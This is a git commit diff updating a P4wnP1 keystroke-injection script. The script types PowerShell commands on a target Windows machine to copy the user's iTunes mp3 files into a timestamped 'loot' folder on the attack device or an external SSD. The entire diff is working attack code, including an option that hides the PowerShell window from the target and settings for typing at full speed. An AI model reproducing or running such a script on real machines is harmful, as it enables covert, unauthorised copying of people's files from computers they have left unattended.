43b0874c0e6341513d433b3af107cebe0ebd5b2b
Chris <77923728+chriskalv@users.noreply.github.com>
2022-07-28 12:02:24 +0200

    Update music_extraction.js

--- music_extraction.js
+++ music_extraction.js
@@ -1,24 +1,25 @@
-/*##################################################################################\
-# music_extraction.js                                                               #
-#   This script will extract all saved music files from iTunes standard             #
-#   directory and save them to P4wnP1.                                              #
-#                                                                                   #
-#   Author: Saytonic                                                                #
-#   Edited by: chriskalv                                                            #
-#                                                                                   #
-# PREREQUISTES:                                                                     #
-#   - Enable keyboard and USB storage capability on your P4wnP1.                    #
-\##################################################################################*/
+/*#########################################################################\
+# music_extraction.js                                                      #
+#   This script will extract all saved music files from iTunes standard    #
+#   directory and save them to P4wnP1 (or another specified hard disk).    #
+#                                                                          #
+#   Author: chriskalv                                                      #
+#                                                                          #
+# PREREQUISTES:                                                            #
+#   - Enable keyboard and USB storage capability on your P4wnP1.           #
+\#########################################################################*/
 
 
-/////////////////////////////// SETTINGS //////////////////////////////\
-// GENERAL                                                             // ---
-layout("de");                                                          // Keyboard layout
-typingSpeed(0,0);                                                      // Typing = really fast
-hide=false;                                                            // Set to true to hide the console window on the target
-exit=true;                                                             // Set to true to exit the console once finished
-var usb_drive = "TEMPUSB"                                              // The name of the P4wnP1's USB storage device
-////////////////////////////////////////////////////////////////////////
+//////////////////// SETTINGS //////////////////\
+// GENERAL                                     // ---
+layout("de");                                  // Keyboard layout
+typingSpeed(0,0);                              // Typing = really fast
+hide=false;                                    // Set to true to hide the console window on the target
+exit=true;                                     // Set to true to exit the console once finished
+copy_to_ssd=false;                             // Set to true to copy to an external SSD instead of P4wnP1 mass storage
+var usb_drive = "TEMPUSB"                      // The name of the P4wnP1's USB storage device
+var ssd_drive = "SSD"                          // The name of your SSD drive that the music should be copied to instead of the P4wnP1 mass storage
+////////////////////////////////////////////////
 
 // Definition of other variables, arrays, ...
 var delay_time = 5                             // The time to wait before executing the attack in seconds
@@ -27,20 +28,26 @@ var ready = "False"                            // Used to make sure that the att
 // FUNCTIONS
 function attack() {
     press("GUI r");
-    delay(500);
+    delay(600);
     if (hide) type("powershell -w h -NoP -NonI"); else type("powershell");
+    press("ENTER")
     delay(1000);
 
-// Find the P4wnP1 USB drive, create /loot path with current timestamp and get other necessary path info
-    type("$usbPath =((gwmi win32_volume -f 'label=''" + usb_drive + "''').Name);");
+  // Find the P4wnP1 USB drive (or the external ssd), create /musicloot path with current timestamp
+    if (copy_to_ssd) {
+        type("$usbPath =((gwmi win32_volume -f 'label=''" + ssd_drive + "''').Name);");
+    }
+    else {
+        type("$usbPath =((gwmi win32_volume -f 'label=''" + usb_drive + "''').Name);");
+    }
     type("$timestamp = Get-Date -Format '(dd-MM-yyyy_HH-mm)';");
-    type("$lootfolder = 'music_loot_' +$timestamp;");
-    type("$lootPathItunes = $usbPath+ '' +$lootfolder+ '\\itunes\';mkdir $lootPathItunes;");
+    type("$lootfolder = 'musicloot_' +$timestamp;");
+    type("$lootPathItunes = $usbPath+ '' +$lootfolder+ '\\itunes\';mkdir $lootPathItunes;\n");
 
-// Copy files
-    type("Get-ChildItem '$env:SystemDrive\\Users\\$env:UserName\\Music\\iTunes\\iTunes Media\\' -Recurse -Include *.mp3 | ForEach-Object ` {copy $_ -Destination $lootPathItunes};");  
+  // Copy files
+    type("Get-ChildItem C:\\Users\\$env:UserName\\Music\\iTunes\\ -Recurse -Include *.mp3 | ForEach-Object ` {copy $_ -Destination $lootPathItunes};\n");
 
-//Exit the console if chosen to do so      
+  //Exit the console if chosen to do so      
     if (exit) { type("exit\n"); }
 }
 function check_if_ready() {
